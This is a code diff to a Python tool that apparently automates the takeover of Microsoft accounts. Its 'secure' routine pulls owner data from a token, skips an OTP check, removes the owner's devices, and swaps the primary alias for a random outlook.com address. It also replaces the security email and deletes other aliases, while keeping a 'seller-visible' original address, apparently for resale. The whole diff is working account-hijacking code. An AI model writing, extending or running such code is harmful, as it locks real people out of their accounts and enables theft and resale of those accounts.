@@ -265,6 +265,14 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     owner_info = await get_owner_info(session, verification_tokens["profile"])
     if not isinstance(owner_info, dict):
         owner_info = {}
+    # Profile API often 401s when MSAL silent bridge never finishes — JWT still
+    # has given_name / family_name / birthdate / ctry (dona-era accounts too).
+    if not owner_info.get("firstName") and not owner_info.get("signInEmail"):
+        from securing.utils.ogi.owner_from_jwt import owner_info_from_amc_jwt
+
+        jwt_info = owner_info_from_amc_jwt(session)
+        if jwt_info:
+            owner_info = {**jwt_info, **{k: v for k, v in owner_info.items() if v}}
     if not isinstance(contacts, dict):
         contacts = {}
     if not isinstance(family, dict):
@@ -310,12 +318,15 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
 
     security_parameters = None
     try:
+        # After recover we already have password + recovery. Skip proofs OTP only when
+        # we are NOT changing primary alias — names/manage needs SA elevation (i5600).
         security_parameters = json.loads(
             await security_information(
                 session,
                 security_email=ms.get("security_email"),
                 account_email=ms.get("email"),
                 password=ms.get("password"),
+                skip_i5600_otp=has_recovery and not replace_alias,
             )
         )
     except RuntimeError as exc:
@@ -349,6 +360,9 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     # Seed primary immediately so partial failures still show the real address
     if main_email and main_email != "Couldn't Change!":
         account_info["microsoft"]["email"] = main_email
+        # Freeze seller-visible address before any primary alias replace
+        if not account_info["microsoft"].get("original_email"):
+            account_info["microsoft"]["original_email"] = main_email
     print(f"[+] - Got Security Parameters (primary={account_info['microsoft']['email']})")
 
     encryptedNetID = None
@@ -407,23 +421,35 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         # Remove Microsoft Devices
         await remove_devices(session, verification_tokens["devices"], devices)
 
+        # Seed login email before alias replace (updated only if MakePrimary wins)
+        if main_email:
+            account_info["microsoft"]["email"] = main_email
+
+        # Primary alias replace does NOT require security_parameters / t0 —
+        # only apicanary + names/manage session (dona-fork flow).
+        if replace_alias:
+            print("[~] - Changing Primary Alias")
+            primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
+            ms = account_info.get("microsoft") or {}
+            # Preserve seller-visible original before promote
+            if not ms.get("original_email"):
+                ms["original_email"] = ms.get("email") or main_email
+                account_info["microsoft"] = ms
+            changed = await change_primary_alias(
+                session,
+                primaryEmail,
+                apicanary,
+                security_email=ms.get("security_email"),
+                account_email=ms.get("original_email") or ms.get("email") or main_email,
+                password=ms.get("password"),
+            )
+            if changed:
+                account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
+            else:
+                kept = account_info["microsoft"]["email"]
+                print(f"[X] - Failed to change Primary Email (keeping {kept})")
+
         if security_parameters:
-
-            # Changes Primary Alias
-            # Keep current primary unless replace succeeds — never "Couldn't Change!".
-            if main_email:
-                account_info["microsoft"]["email"] = main_email
-            if replace_alias:
-                print("[~] - Changing Primary Alias")
-                primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
-                changed = await change_primary_alias(session, primaryEmail, apicanary)
-                if changed:
-                    account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
-                else:
-                    kept = account_info["microsoft"]["email"]
-                    print(f"[X] - Failed to change Primary Email (keeping {kept})")
-
-
             if recovery:
 
                 security_email = uuid.uuid4().hex[:16]
@@ -447,8 +473,13 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                     print(f"[X] - Failed to secure this account")
 
         # Delete other login aliases (non-fatal — manage page often lacks canary)
+        # Always keep the current primary so a failed MakePrimary doesn't orphan-delete
+        # a freshly added sunny* alias (previous bug).
         try:
-            await delete_aliases(session)
+            await delete_aliases(
+                session,
+                keep_email=account_info["microsoft"].get("email"),
+            )
         except Exception as exc:
             logging.warning("delete_aliases soft-skip: %s", exc)
             print(f"[~] - Skipping alias removal ({exc.__class__.__name__})")
